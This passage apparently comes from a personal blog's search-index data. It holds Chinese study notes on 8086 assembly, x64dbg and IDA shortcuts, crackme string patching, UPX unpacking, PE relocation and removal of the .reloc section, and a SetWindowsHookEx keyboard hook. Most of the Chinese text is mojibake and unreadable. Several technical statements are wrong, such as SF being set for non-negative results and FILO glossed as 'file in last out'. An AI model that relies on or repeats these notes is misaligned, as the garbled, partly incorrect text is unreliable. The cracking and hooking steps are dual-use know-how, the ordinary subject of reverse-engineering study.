21 22 23 24 25 26 27 28 29 30 31 32 33 assume cs:code code segment â€‹ mov bx,0ï¼›åç§»ä½ç½®ä»0å¼€å§‹ â€‹ mov cx,12ï¼›å¾ªç¯12æ¬¡ s: mov ax,0fffh â€‹ mov ds,axï¼›(ds)=0ffffh â€‹ mov dl,[bx]ï¼›(dl)=((ds)*16+(bx))ï¼Œå°†ffff:bxä¸­çš„æ•°æ®é€å…¥dl â€‹ mov ax,0020h â€‹ mov ds,axï¼›ï¼ˆds)=0020h â€‹ mov [bx],dlï¼›ï¼ˆ(ds)*16+bxï¼‰=(dl),å°†dlçš„æ•°æ®é€å…¥0020:bx â€‹ inc bxï¼›åç§»ä½ç½®åŠ 1 â€‹ loop s â€‹ mov ax,4c00h â€‹ int 21h code ends end ä»£ç æ®µä¸­ä½¿ç”¨æ ˆ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 assume cs:codesg codesg segment â€‹ dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h â€‹ dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0;ç”¨dwå®šä¹‰16ä¸ªå­—å‹æ•°æ®ï¼Œåœ¨ç¨‹åºåŠ è½½åï¼Œå°†å–å¾—16ä¸ªå­—çš„å†…å­˜ç©ºé—´ï¼Œå­˜æ”¾16ä¸ªæ•°æ®ï¼Œåœ¨åé¢çš„ç¨‹åºä¸­å°†è¿™æ®µç©ºé—´å½“ä½œæ ˆæ¥ä½¿ç”¨ start: mov ax,cs â€‹ mov ss,ax â€‹ mov sp,30h â€‹ mov bx,0 â€‹ mov cx,8 â€‹ s:push cs:[bx] â€‹ add bx,2 â€‹ loop s;å°†ä»£ç 0-15å•å…ƒä¸­çš„8ä¸ªå­—å‹æ•°æ®ä¾æ¬¡å…¥æ ˆ â€‹ mov bx,0 â€‹ mov cx,8 â€‹ s0:pop cs:[bx] â€‹ add bx,2 â€‹ loop s0;å‡ºæ ˆ8ä¸ªå­—å‹æ•°æ®åˆ°ä»£ç æ®µ0-15å•å…ƒ â€‹ mov ax,4c00h â€‹ int 21h codesg ends end start;æŒ‡æ˜ç¨‹åºçš„å…¥å£åœ¨startå¤„ åˆå§‹çŠ¶æ€ä¸‹æ ˆä¸ºç©ºï¼Œæ‰€ä»¥ss:spè¦æŒ‡å‘æ ˆåº•\nå°†æ•°æ®ï¼Œä»£ç ï¼Œæ ˆæ”¾å…¥ä¸åŒçš„æ®µ\nQAï¼šCPUå¦‚ä½•çŸ¥é“stackæ”¾æ ˆï¼Œdataæ”¾æ•°æ®ï¼Ÿ mov ax,stack\nmov ss,ax\nmov sp,20h\nè®¾ç½®ssæŒ‡å‘stackï¼Œè®¾ç½®ss:spæŒ‡å‘stack:20\nå¤§å°å†™è½¬æ¢é—®é¢˜ æ€è·¯ï¼šå¤§å†™ASCIIç çš„ç¬¬5ä½ä¸º0ï¼Œå°å†™å­—æ¯çš„ç¬¬5ä½ä¸º1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 assume cs:codesg,ds:datasg datasg segment db \u0026#39;Basic\u0026#39; db \u0026#39;iNfOrMaTiOn\u0026#39; datasg ends codesg segment start:mov ax,datasg mov ds,ax;è®¾ç½®dsæŒ‡å‘daatsg mov bx,0;è®¾ç½®ï¼ˆbxï¼‰=0ï¼Œds:bxæŒ‡å‘â€˜Basicâ€™çš„ç¬¬ä¸€ä¸ªå­—æ¯ mov cx,5;è®¾ç½®å¾ªç¯æ¬¡æ•°5ï¼Œå› ä¸ºâ€˜Basicâ€™æœ‰5ä¸ªå­—æ¯ s:mov al,[bx];å°†ASCIIç ä»ds:bxæ‰€æŒ‡å‘çš„å•å…ƒä¸­å–å‡º and al,11011111B;å°†alä¸­çš„ASCIIç çš„ç¬¬5ä½ç½®ä¸º0ï¼Œå˜ä¸ºå¤§å†™å­—æ¯ mov [bx],al;å°†è½¬å˜åçš„ASCIIç å†™å›åŸå•å…ƒ inc bx loop s mov bx,5 mov cx,11 s0:mov al,[bx] or al,00100000B;å°†ç¬¬5ä½ç½®å˜ä¸º1 mov [bx],al inc bx loop s0 mov ax,4c00h int 21h codesg ends end start [bx]ä¸€ä¸ªå†…å­˜å•å…ƒ\n[bx+idata]è¡¨ç¤ºä¸€ä¸ªå†…å­˜å•å…ƒ\nä¸‹é¢ä¸‰ä¸ªæŒ‡ä»¤ç›¸åŒ\nmov ax,[bx+200] mov ax,200[bx] mov ax,[bx],200 ä¸‹é¢ä¸¤ä¸ªæŒ‡ä»¤ç›¸åŒ\nmov ax,[bx+si] mov ax,[bx] [si] (ax)=((ds)*16+(bx)+(si))\nidataæ˜¯å¸¸é‡ï¼Œbx,siæ˜¯å˜é‡\nregè¡¨ç¤ºä¸€ä¸ªå¯„å­˜å™¨ï¼Œsregè¡¨ç¤ºä¸€ä¸ªæ®µå¯„å­˜å™¨\nå…³æ³¨æœºå™¨æŒ‡ä»¤å¤„ç†çš„æ•°æ®åœ¨ä»€ä¹ˆåœ°æ–¹\nmov bx,[0]ï¼›å†…å­˜ï¼Œds:0å•å…ƒ\nmov bx,axï¼›CPUå†…éƒ¨ï¼Œaxå¯„å­˜å™¨\nmov bx,1ï¼›CPUå†…éƒ¨ï¼ŒæŒ‡ä»¤ç¼“å­˜å™¨\næ®µåœ°å€ï¼ˆSAï¼‰å’Œåç§»åœ°å€ï¼ˆEAï¼‰ mov ax,ds:[bp] (ax)=(ds)*16+(bp)\nSA=(ds)ï¼ŒEA=(bp)\nX ptræŒ‡æ˜å†…å­˜å•å…ƒçš„é•¿åº¦ï¼ŒXå†æ±‡ç¼–æŒ‡ä»¤ä¸­å¯ä»¥ä¸ºwordæˆ–byte\nä¾‹å¦‚mov word ptr ds:[0],1 æŒ‡æ˜äº†æŒ‡ä»¤è®¿é—®çš„å†…å­˜å•å…ƒæ˜¯ä¸€ä¸ªå­—å•å…ƒ\ndbå­—èŠ‚å‹ dwå­—å‹ ddåŒå­—å‹æ•°æ®\nå¦‚dd 100\ndupé‡å¤\ndw ï¼ˆé‡å¤æ¬¡æ•°ï¼‰ dump ï¼ˆæ•°æ®ï¼‰\nå¦‚db 3 dup (0) ,å³db 0,0,0\ndb 3 dup(0,1,2),å³db 0,1,2,0,1,2,0,1,2\nè½¬ç§»æŒ‡ä»¤çš„åŸç† 1 2 3 4 5 6 7 8 9 start:mov ax,0 mov bx,0 jmp short s add ax,1 s:inc REVIEW:1.ä»CSï¼šIPæŒ‡å‘å†…å­˜å•å…ƒè¯»å–æŒ‡ä»¤ï¼Œè¯»å–çš„æŒ‡ä»¤è¿›å…¥æŒ‡ä»¤ç¼“å†²å™¨ï¼›2.(IP)=(IP)+æ‰€è¯»å–æŒ‡ä»¤é•¿åº¦ï¼Œä»è€ŒæŒ‡å‘ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼›3.æ‰§è¡ŒæŒ‡ä»¤ï¼Œè½¬åˆ°1ï¼Œé‡å¤è¿‡ç¨‹\nCS= ,IP= CS:IPæŒ‡å‘EB 03ï¼ˆjump short sçš„æœºå™¨ç ) è¯»å–æŒ‡ä»¤ç EB 03è¿›å…¥æŒ‡ä»¤ç¼“å†²å™¨ IP=IP+æ‰€è¯»å–æŒ‡ä»¤é•¿åº¦ï¼ˆ2ï¼‰ï¼ŒæŒ‡å‘add ax,1 CPUæ‰§è¡ŒæŒ‡ä»¤ç¼“å†²å™¨ä¸­çš„æŒ‡ä»¤EB 03ï¼ˆé‡ç‚¹ï¼Œå¦‚æœEB 03æ²¡æœ‰å¯¹IPä¿®æ”¹çš„è¯ï¼Œåº”è¯¥æ‰§è¡Œadd axï¼Œ1ï¼‰ æ‰§è¡Œåï¼ŒIP=000BHï¼ŒCS:IPæŒ‡å‘inc ax jmp word ptr å†…å­˜å•å…ƒåœ°å€ï¼ˆæ®µå†…è½¬ç§»ï¼‰\njmp dword ptr å†…å­˜å•å…ƒåœ°å€ï¼ˆæ®µé—´è½¬ç§»ï¼‰\njcxzç›¸å½“äºif((cx)==0)jump short æ ‡å·ï¼›\nloopç›¸å½“äºï¼ˆcx)\u0026ndash;;if((cx)!=0)jump short æ ‡å·ï¼›\njump short sçš„è½¬ç§»èŒƒå›´æ˜¯-128~127\noffset\nCPUæ‰§è¡ŒretæŒ‡ä»¤ï¼Œä¿®æ”¹IPï¼Œpop IP\n(IP)=((ss)*16+(sp))\n(sp)=(sp)+2\nCPUæ‰§è¡ŒretfæŒ‡ä»¤,ä¿®æ”¹CSå’ŒIP,POP IP,POP CS\n(IP)=((ss)*16+(sp))\n(sp)=(sp)+2\n(IP)=((ss)*16+(sp))\n(sp)=(sp)+2\nCPUæ‰§è¡ŒcallæŒ‡ä»¤ï¼Œå°†CSå’ŒIPå‹å…¥æ ˆï¼Œè½¬ç§»,pump IP ;jmp near ptræ ‡å·\n(sp)-=2\n((ss)*16+(sp))=(IP)\nIP+=16ä½ä½ç§»\ncall far ptr ç›¸å½“äºpush CS; push IP; jmp far ptr\nmov ax,6;call axå°†6å­˜å…¥axï¼Œè°ƒç”¨åœ°å€6å¤„çš„å‡½æ•°\nmulåšä¹˜æ³•ï¼Œè¦ä¹ˆéƒ½æ˜¯16ä½è¦ä¹ˆéƒ½æ˜¯8ä½\nmul byte ptr ds:[0]\n(ax)=(al)*((ds)*16+0)\nZFæ ‡å¿—ï¼šé›¶æ ‡å¿—ä½ã€‚ç»“æœä¸º0ï¼ŒZF=1ï¼ˆé€»è¾‘ä¸ºçœŸï¼‰,ç»“æœä¸º1ï¼ŒZF=0\nPFæ ‡å¿—:å¥‡å¶æ ‡å¿—ä½ï¼Œbitä½ä¸ªæ•°æ˜¯å¦ä¸ºå¶æ•°\nSFæ ‡å¿—ï¼šç¬¦å·æ ‡å¿—ä½ï¼Œéè´Ÿï¼Œsf=1\nCFæ ‡å¿—ï¼šè¿›ä½æ ‡å¿—ç¬¦ï¼Œ\ncmp axï¼Œbxå³æ¯”è¾ƒax-bx\njeç­‰äºåˆ™è½¬ç§»\njne\njbä½äºåˆ™è½¬ç§»below\njnbä¸ä½äºåˆ™è½¬ç§»\njaé«˜äºåˆ™è½¬ç§»above\njnaä¸é«˜äºåˆ™è½¬ç§»\n","date":"2025-02-24T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/","title":"æ±‡ç¼–è¯­è¨€"},{"content":"å…¥å£E8 00 CALL ~ Add ~\nF7 æ­¥å…¥\nF8 æ­¥å‡º\nctrl+F9 execute till return è·³å‡ºå‡½æ•°\nctrl+G ç§»åŠ¨åˆ°æŒ‡å®šä½ç½®\nctrl+F2 é‡æ–°è°ƒè¯•\nF9 è¿è¡Œè‡³æ–­ç‚¹å¤„\nAlt + B æ‰“å¼€Breakpointsï¼Œåˆ—å‡ºæ–­ç‚¹\nï¼›æ·»åŠ æ³¨é‡Š\nalt+M å†…å­˜æ¨¡å—\nctrl+Eæ‰“å¼€ç¼–è¾‘çª—å£\nè¿è¡Œç›´æ¥åˆ°æ–­ç‚¹å¤„ï¼Œæ­¥è¿›æ­¥å‡ºé€è¡Œè¿›è¡Œ\nå¿«é€ŸæŸ¥æ‰¾æŒ‡å®šä»£ç  ä»å…¥å£å¤„ä¸æ–­F8ç›´åˆ°æŸä¸ªå‡½æ•°è¢«æ‰§è¡Œï¼Œå¼¹çª— æŸ¥æ‰¾å­—ç¬¦ä¸²æ£€ç´¢ï¼ˆæœ‰ä¸ªæ€è·¯ï¼Œå¯ä»¥å†IDAä¸­çœ‹å‡½æ•°æ¨¡å—çš„åœ°å€ï¼Œå†åœ¨xdbgä¸­ctrl+Gè·³è½¬åˆ°åœ°å€ï¼‰ æŸ¥æ‰¾è°ƒç”¨æ¨¡å— åœ¨main()å¤„æ‰“æ–­ç‚¹ï¼Œè®°ä½œè¿”å›ç‚¹\nä¿®æ”¹å­—ç¬¦ä¸²\nè·³è½¬è‡³å­—ç¬¦ä¸²æº¢å‡ºåŒºbufferï¼ˆå°±æ˜¯åœ°å€ï¼Œå¯ä»¥ç”¨IDAå…ˆæ‰¾ä¸€ä¸‹ï¼‰ï¼Œctrl+Eæ‰“å¼€ç¼–è¾‘çª— ç¼ºç‚¹ï¼šæ–°å­—ç¬¦ä¸²ä¸èƒ½æ¯”åŸå­—ç¬¦ä¸²é•¿\næ–¹æ³•äºŒï¼š æŠŠå­—ç¬¦ä¸²å­˜åˆ°ç¼“å†²åŒºï¼Œä¿®æ”¹PUSHå¤„æŒ‡ä»¤ctrl+E\nåœ¨åŸå­—ç¬¦æ±‡ç¼–æŒ‡ä»¤å¤„ï¼Œç©ºæ ¼é”®æ‰“å¼€assembleçª—å£ï¼Œæ”¹æˆâ€PUSH 504FF0â€œ\næ ˆé¡¶æŒ‡é’ˆESPï¼šå‘æ ˆå‹å…¥æ•°æ®ï¼Œæ ˆé¡¶æŒ‡é’ˆå‡å°ï¼Œå‘ä½åœ°å€ç§»åŠ¨ï¼Œä»æ ˆä¸­å¼¹å‡ºæ•°æ®æ—¶ï¼Œæ ˆé¡¶æŒ‡é’ˆå¢åŠ ï¼ˆç†è§£æˆä¸€ä¸ªæ— ç›–å®¹å™¨åº•éƒ¨è£…äº†ä¸€å¼¹ç°§ï¼‰\nä¸€äº›å¯¹äºæ ˆFILOï¼ˆfile in last outï¼‰çš„ç†è§£ åœ¨è°ƒè¯•æ—¶ï¼Œä»ä¸€ä¸ªå‡½æ•°å…¥å£å¤„å¼€å§‹ESPåœ°å€å‡å°‘ï¼Œè¯´æ˜å‡½æ•°è°ƒç”¨å‚æ•°ï¼ŒæŠŠæ•°æ®å‹å…¥æ ˆ\ncrakeme2 F9è¿è¡Œåï¼Œé¦–å…ˆè°ƒç”¨çš„å°±æ˜¯ä¸»å‡½æ•°\n401248å¤„çš„push401E14å‘½ä»¤æ¥æŠŠ401E14å‹å…¥æ ˆï¼Œç„¶å40123Då¤„CALL\u0026lt;\u0026gt;è°ƒç”¨401232å¤„çš„JMP ThunRTMainå‡½æ•°ï¼Œä¼šè·³è½¬åˆ°ä¸»å‡½æ•°ThunRTMainï¼Œå‰é¢çš„401E14çš„å€¼ä½œä¸ºThunRTMain()çš„å‚æ•°ï¼Œè¿™æ˜¯ä¸€ä¸ªé—´æ¥è°ƒç”¨ï¼Œåˆ©ç”¨é”™è¯¯æ¶ˆæ¯æ¡†å’Œå­—ç¬¦ä¸²ï¼Œå­—ç¬¦æŸ¥æ‰¾ï¼Œå¾€ä¸Šæ‰¾æ¡ä»¶åˆ†æ”¯\nè°ƒç”¨403329å¤„çš„å‡½æ•°ï¼Œæ¯”è¾ƒå‡½æ•°å€¼ï¼Œå†å†³å®šè·³è½¬\næ ˆå¸§ 1 2 3 4 5 6 7 8 9 10 11 PUSH EBP ;å‡½æ•°å¼€å§‹ MOV EBP,ESP;ä¿å­˜å½“å‰ESPåˆ°EBPä¸­ ....... ;æ— è®ºESPå€¼å¦‚ä½•å˜ï¼ŒEBPéƒ½ä¿æŒä¸å˜ MOV ESP,EBP;å°†å‡½æ•°çš„èµ·å§‹åœ°å€è¿”å›åˆ°ESPä¸­ POP EBP ;å‡½æ•°è¿”å›å‰å¼¹å‡ºä¿å­˜åœ¨æ ˆä¸­çš„EBPå€¼ RETN ;å‡½æ•°ç»ˆæ­¢ å‡½æ•°è¿”å›å‰è¦å…ˆä»æ ˆä¸­åˆ é™¤ä¸å…¶å¯¹åº”çš„æ ˆå¸§\næŒ‰ç…§ä¼ é€’ç»™rctMsgBox()å‚æ•°çš„å¤§å°14æ¸…ç†æ ˆ\nRETN XX:æ ¹æ®ä¼ å‚çš„å¤§å°è°ƒæ•´æ ˆ\nPEå¤´ DOSå¤´ï¼štypedef struct_IMAGE_DOS_HEADER,e_magic:DOSç­¾å,e_ifanew:NTå¤´åç§»\nNTå¤´ï¼šIMAGE_NT_HEADERS\nUPX upx -o ç›®æ ‡æ–‡ä»¶ æºæ–‡ä»¶\nå¯ä»¥çœ‹åˆ°æ–‡ä»¶å¤§å°ç”±67584å˜ä¸º48640ï¼Œæ¯”ZIPå‹ç¼©åå¤§ï¼Œæ˜¯å› ä¸ºå‹ç¼©åå¾—åˆ°PEæ–‡ä»¶ï¼Œéœ€è¦æ·»åŠ PEå¤´ï¼Œå¹¶ä¸”è¿˜è¦æ”¾å…¥è§£å‹ç¼©ä»£ç \nè°ƒè¯•notepadç¨‹åº å…ˆæ‰¾åˆ°EPä»£ç ï¼ˆå¶ç„¶å‘ç°ä¸€ä¸ªå¥½åŠæ³•ï¼Œåªè¦åœ¨å¼€å¤´ctrl+F8ï¼Œç»“æŸåxdbgä¼šè‡ªåŠ¨æš‚åœåˆ°å…¥å£ç‚¹ï¼‰EPå¼€å§‹æ—¶0101å¼€å¤´ï¼Œå‰é¢éƒ½æ˜¯0701å¼€å¤´\nåœ¨EPå¤„ctrl+F8å¼€å§‹ä»£ç è¿½è¸ªï¼Œå‘ç°æœ‰ä¸€ä¸ªçŸ­å¾ªç¯ï¼Œåœ¨å¾ªç¯æœ«å°¾è®¾ç½®æ–­ç‚¹ï¼ŒF9è·³å‡ºå¾ªç¯\nUPXç‰¹å¾ä¹‹ä¸€æ˜¯,EPä»£ç è¢«åŒ…å«åœ¨PUSHAD/POPADæŒ‡ä»¤ä¹‹é—´ï¼Œè·³è½¬åˆ°OEPä»£ç çš„JMPæŒ‡ä»¤ç´§æ¥ç€å‡ºç°åœ¨POPADä¹‹åï¼Œåªè¦åœ¨JMPæŒ‡ä»¤å¤„è®¾ç½®å¥½æ–­ç‚¹ï¼Œè¿è¡Œåå°±èƒ½ç›´æ¥æ‰¾åˆ°OEP\nPEé‡å®šå‘åŸç† PEé‡å®šå‘å°±æ˜¯PEæ–‡ä»¶æ— æ³•åŠ è½½åˆ°ImageBaseæ‰€æŒ‡ä½ç½®ï¼Œè€Œæ˜¯è¢«åŠ è½½åˆ°å…¶ä»–åœ°å€æ—¶å‘ç”Ÿçš„ä¸€ç³»åˆ—çš„å¤„ç†è¡Œä¸º\nåŸºæœ¬åŸç†ï¼šåœ¨åº”ç”¨ç¨‹åºä¸­æŸ¥æ‰¾ç¡¬ç¼–ç çš„åœ°å€ä½ç½®ï¼Œè¯»å–å€¼åï¼Œå‡å»ImageBase(VA-RVA),åŠ ä¸Šå®é™…åŠ è½½åœ°å€ï¼ˆRVA-VA)\nå…ˆæŸ¥æ‰¾IMAGE_BASE_RELOCATION\n1 2 3 4 5 6 7 typedef struct _IMAGE_BASE_RELOCATION { DWORD VirtualAddress; // é‡å®šä½é¡µçš„ RVA DWORD SizeOfBlock; // é‡å®šä½å—çš„å¤§å° WORD TypeOffset; // é‡å®šä½æ¡ç›®çš„ç±»å‹äºåç§» } _IMAGE_BASE_RELOCATION; typedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION; irtualAddress é‡å®šä½é¡µ RVAã€‚ä»¥æ˜ åƒè£…è½½åŸºå€åŠ ä¸Šé¡µ RVA çš„å’Œä½œä¸ºè¢«åŠ æ•°ï¼Œå†åŠ ä¸Šé‡å®šä½é¡¹å¯¹åº”çš„ offset å°±èƒ½å¾—åˆ°å…¶åœ¨å†…å­˜ä¸­å®é™…çš„ VAã€‚æœ€åä¸€ä¸ªé‡å®šä½å—çš„å°¾éƒ¨ä¹Ÿä¼šæ·»åŠ ä¸€ä¸ª virtualaddress å­—æ®µä½œä¸ºç»“æŸæ ‡å¿—ã€‚\nSizeOfBlock åŸºå€é‡å®šä½å—çš„å¤§å°ã€‚åŒ…æ‹¬ VirtualAddressï¼ŒSizeOfBlockï¼Œä»¥åŠåé¢ TypeOffset çš„å¤§å°ã€‚\nTypeOffset ä¸€ä¸ªæ•°ç»„ã€‚æ•°ç»„ä¸­æ¯ä¸ªå…ƒç´ å¤§å°ä¸º 2 ä¸ªå­—èŠ‚ï¼Œå³ 16 ä½ã€‚\ntype é«˜ 4 ä½ç”¨äºè¡¨ç¤ºé‡å®šä½çš„ç±»å‹ã€‚\noffset ä½ 12 ä½ç”¨äºè¡¨ç¤ºé‡å®šä½æ•°æ®ä½ç½®ç›¸å¯¹äºé¡µ RVA çš„åç§»é‡ã€‚ä¸ VirtualAddress ç›¸åŠ å°±æ˜¯è¦ä¿®æ”¹çš„é‡å®šä½æ•°æ®çš„æŒ‡é’ˆï¼Œå†åŠ ä¸Šæ˜ åƒè£…è½½åŸºå€å°±æ˜¯ä¿®æ”¹åçš„æŒ‡é’ˆã€‚\nç¡¬ç¼–ç åœ°å€åç§»ï¼šVirtualSize+Offset=1420(RVA)\nå‡å»ImageBaseå€¼\nåŠ ä¸Šå®é™…åŠ è½½åœ°å€å€¼\nä»å¯æ‰§è¡Œæ–‡ä»¶ä¸­åˆ é™¤.relocèŠ‚åŒº å‰æï¼šåˆ é™¤åŸºç¡€é‡å®šä½è¡¨å¯¹è¿è¡Œæ²¡ä»€ä¹ˆå½±å“\nä»æ–‡ä»¶åç§»270å¼€å§‹ï¼Œåˆ°297\næ‰“å¼€010Editorç›´æ¥åˆ é™¤ï¼Œè‡³æ­¤,.relocè¢«ç‰©ç†åˆ é™¤ï¼Œä¹‹åå¼€å§‹ä¿®æ”¹ç›¸å…³PEå¤´ä¿¡æ¯ï¼ˆå°±åƒæ”¹é…ç½®ä¸€æ ·ï¼‰\nä¿®æ”¹IMAGE_FILE_HEADER-NUMBER of SECTIONSï¼Œ5æ”¹æˆ4\nä¹‹åä¿®æ”¹IMAGE_OPTIONAL_HEADER-size of image\nVirualSizeæ—¶E40ï¼ŒSection Alignmentå€¼ä¸º1000ï¼Œæ•…è¦å‡å»1000\nupackå‹ç¼©åçš„æ–‡ä»¶ æŠŠPEæ–‡ä»¶å¤´å˜å½¢ï¼Œè¿™éƒ¨åˆ†æœ‰ç‚¹ä¸å¤ªæ˜ç™½ï¼Œå¤§æ¦‚å°±æ˜¯å¢å¤§SizeOfOptionalHeaderçš„å€¼ï¼Œåœ¨IMAGE_OPTIONAL_HEADERå’ŒIMAGE_SECTION_HEADERä¹‹é—´æ·»åŠ é¢å¤–ç©ºé—´ï¼Œæ·»åŠ è§£ç ä»£ç ï¼Œå¦‚ä¸‹\nä»170å¼€å§‹æ˜¯IMAGE_SECTION_HEADER\næ‰“å¼€sectioné€‰é¡¹ï¼Œè§‚å¯Ÿåˆ°ç¬¬ä¸€ä¸ªèŠ‚åŒºå’Œç¬¬ä¸‰ä¸ªèŠ‚åŒºrawoffsetèµ·å§‹åç§»éƒ½æ˜¯10ï¼Œç”±æ­¤å¯çŸ¥Upackä¼šå¯¹PEæ–‡ä»¶å¤´ï¼Œç¬¬ä¸€ä¸ªèŠ‚åŒºï¼Œç¬¬ä¸‰ä¸ªèŠ‚åŒºè¿›è¡Œé‡å \nè¿›è¡Œè°ƒè¯•ï¼Œå…ˆè¦æ‰¾å‡ºEPå…¥å£ï¼ŒEPçš„RVAä¸º1018ï¼ŒImageBaseä¸º0100000ï¼Œæ•…EPçš„VAå€¼ä¸º01001018ï¼Œxdbgå·²ç»æ‰“å¥½æ–­ç‚¹äº†\nï¼ˆå¿˜è®°ä¿å­˜äº†ï¼‰\nWindowsæ¶ˆæ¯é’©å– HookMain.exeæœ€å…ˆåŠ è½½Keyhook.dllå®‰è£…é”®ç›˜é’©å­ï¼Œä½¿ç”¨SetWindowsHookEX()å®‰è£…é”®ç›˜é’©å­ï¼ŒOSå¼ºåˆ¶é”®ç›˜è¾“å…¥äº‹ä»¶ï¼Œè°ƒç”¨KeyHook.dllæ³¨å…¥åˆ°ç›¸åº”è¿›ç¨‹çš„å†…å­˜ï¼Œè°ƒç”¨KeuboardProc()å‡½æ•°ï¼Œåœ¨ProcessExplorerä¸­æ£€ç´¢Keyhook.dllå‘ç°å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 HHOOK SetWindowsHookEx( â€‹ int idHook,//hook type â€‹ HOOKPROC lpfn,//hook procedure â€‹ HINSTANCE hMod,//hook procedureæ‰€å±çš„DLLå¥æŸ„ â€‹ DWORD dwThreadId,//æƒ³è¦é’©è½½çš„çº¿ç¨‹ ) ","date":"2025-02-24T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E9%80%86%E5%90%91%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/","title":"é€†å‘æ ¸å¿ƒåŸç†"},{"content":" 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 # Fç³»åˆ—ã€ä¸»è¦æ˜¯è°ƒè¯•çŠ¶æ€çš„å¤„ç†ã€‘ F2 æ·»åŠ /åˆ é™¤æ–­ç‚¹ F4 è¿è¡Œåˆ°å…‰æ ‡æ‰€åœ¨ä½ç½® F5 åæ±‡ç¼– F7 å•æ­¥æ­¥å…¥ F8 å•æ­¥è·³è¿‡ F9 æŒç»­è¿è¡Œç›´åˆ°è¾“å…¥/æ–­ç‚¹/ç»“æŸ shiftç³»åˆ—ã€ä¸»è¦æ˜¯è°ƒå‡ºå¯¹åº”çš„é¡µé¢ã€‘ shift+F1 Local types shift+F2 execute scriptsã€å¸¸ç”¨ã€‘ shift+F3 Functions shift+F4 Names shift+F5 Signatures shift+F7 Segments shift+F8 Segments registers shift+F9 Structures shift+F10 Enumerations shift+F11 Type libraries shift+F12 Stringsã€å¸¸ç”¨ã€‘ Shift+E å¯¼å‡ºæ•°æ®ã€å¸¸ç”¨ã€‘ # å•å­—ç¬¦ç³»åˆ—ã€åŸºæœ¬æ˜¯æ•°æ®å¤„ç†è½¬æ¢ç›¸å…³ã€‘ã€è¿™äº›éƒ½æ¯”è¾ƒå¸¸ç”¨ã€‘ G æŒ‰åœ°å€æŸ¥æ‰¾ D å°†å­—ç¬¦ä¸²ç­‰å…ƒç´ è½¬ä¸ºæ•°æ® N é‡å‘½åï¼ˆå‡½æ•°åã€å˜é‡åç­‰ï¼‰ Y ä¿®æ”¹å˜é‡ç±»å‹ç­‰ï¼ˆæ¯”å¦‚intæ”¹charç­‰ç­‰ï¼‰ H decimal æ•°æ®çš„è¿›åˆ¶å¿«é€Ÿè½¬æ¢ A å°†æ•°æ®è½¬å˜ä¸ºå­—ç¬¦ä¸²ç±»å‹ C codeï¼ˆå°†æ•°æ®è½¬å˜ä¸ºæ±‡ç¼–ä»£ç ï¼Œåˆ†ä¸ºè‡ªåŠ¨å’Œå¼ºåˆ¶æ‰§è¡Œï¼‰ U undefinedï¼ˆå°†å­—ç¬¦ä¸²è½¬å˜ä¸ºåŸå§‹æ•°æ®ï¼‰ X äº¤å‰å¼•ç”¨ï¼ˆåæ±‡ç¼–é¡µé¢ï¼‰ P é€‰ä¸­ä½ç½®è¯†åˆ«ä¸ºå‡½æ•° # Ctrlã€Altç³»åˆ— Ctrl+F æœç´¢ã€å¸¸ç”¨ã€‘ Ctrl+X äº¤å‰å¼•ç”¨ï¼ˆæ±‡ç¼–é¡µé¢ï¼‰ã€å¸¸ç”¨ã€‘ Alt+T æŸ¥æ‰¾Text Ctrl+T æŸ¥æ‰¾ä¸‹ä¸€ä¸ªtext Alt+C Next Code Ctrl+D Next Data Ctrl+Z æ’¤é”€ Ctrl+Shift+Z æ¢å¤ Alt+K ä¿®æ”¹å †æ ˆå€¼ # else / æ·»åŠ æ³¨é‡Š or å³é”®é€‰æ‹©edit commentã€å¸¸ç”¨ã€‘ \\ hide castï¼Œéšè—/æ˜¾ç¤ºä¸€äº›å˜é‡ç±»å‹æ³¨è§£ Ins æ·»åŠ åŒºå—æ³¨é‡Š é€šç”¨å¯„å­˜å™¨ EAXï¼šï¼ˆé’ˆå¯¹æ“ä½œæ•°å’Œç»“æœæ•°æ®çš„ï¼‰ç´¯åŠ å™¨ EBXï¼šï¼ˆDSæ®µçš„æ•°æ®æŒ‡é’ˆï¼‰åŸºå€å¯„å­˜å™¨ ECXï¼šï¼ˆå­—ç¬¦ä¸²å’Œå¾ªç¯æ“ä½œçš„ï¼‰è®¡æ•°å™¨ EDXï¼šï¼ˆI/OæŒ‡é’ˆï¼‰æ•°æ®å¯„å­˜å™¨ ESIï¼šï¼ˆå­—ç¬¦ä¸²æ“ä½œæºæŒ‡é’ˆï¼‰æºå˜å€å¯„å­˜å™¨ EDIï¼šï¼ˆå­—ç¬¦ä¸²æ“ä½œç›®æ ‡æŒ‡é’ˆï¼‰ç›®çš„å˜å€å¯„å­˜å™¨ EBPï¼šï¼ˆSSæ®µä¸­æ ˆå†…æ•°æ®æŒ‡é’ˆï¼‰æ‰©å±•åŸºå€æŒ‡é’ˆå¯„å­˜å™¨[æ ˆå¸§å¯„å­˜å™¨ã€æ ˆåº•æŒ‡é’ˆå¯„å­˜å™¨] ESPï¼šï¼ˆSSæ®µä¸­æ ˆæŒ‡é’ˆï¼‰æ ˆæŒ‡é’ˆå¯„å­˜å™¨[æŒ‡å‘æ ˆé¡¶] æ®µå¯„å­˜å™¨ CSï¼šä»£ç æ®µå¯„å­˜å™¨ SSï¼šæ ˆæ®µå¯„å­˜å™¨ DSï¼šæ•°æ®æ®µå¯„å­˜å™¨ FSï¼šæ•°æ®æ®µå¯„å­˜å™¨ ESï¼šé™„åŠ æ•°æ®å¯„å­˜å™¨ GSï¼šæ•°æ®æ®µå¯„å­˜å™¨ ç¨‹åºçŠ¶æ€ä¸æ§åˆ¶å¯„å­˜å™¨ EFLAGSï¼šæ ‡å¿—å¯„å­˜å™¨ï¼Œ32ä¸ªä½å…ƒçš„01æ§åˆ¶ ZF(é›¶æ 